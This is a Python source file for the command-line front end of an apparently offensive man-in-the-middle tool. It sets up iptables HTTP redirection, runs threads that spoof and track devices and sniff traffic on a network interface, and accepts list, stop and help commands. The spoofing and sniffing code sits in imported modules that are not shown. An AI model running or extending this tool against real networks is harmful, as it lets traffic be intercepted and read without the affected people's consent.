# mitm_cli.py
import threading
from core.traffic_sniffer import start_sniffing
from core.iptables_manager import enable_http_redirect, clear_rules
from core.device_tracker import DeviceTracker
from config import INTERFACE

def main():
    print("==== MITM CLI Tool ====")
    enable_http_redirect()

    tracker = DeviceTracker()
    tracker_thread = threading.Thread(target=tracker.start_tracking)
    tracker_thread.start()

    sniffer_thread = threading.Thread(target=start_sniffing, args=(INTERFACE,))
    sniffer_thread.start()

    try:
        while True:
            cmd = input("mitm> ").strip().lower()
            if cmd == "list":
                for ip in tracker.list_devices():
                    print(f"[+] Spoofed: {ip}")
            elif cmd == "stop":
                print("[!] Stopping attack...")
                tracker.stop_tracking()
                clear_rules()
                break
            elif cmd == "help":
                print("Commands: list | stop | help")
            else:
                print("Unknown command. Type 'help'.")
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Cleaning up...")
        tracker.stop_tracking()
        clear_rules()

if __name__ == "__main__":
    main()
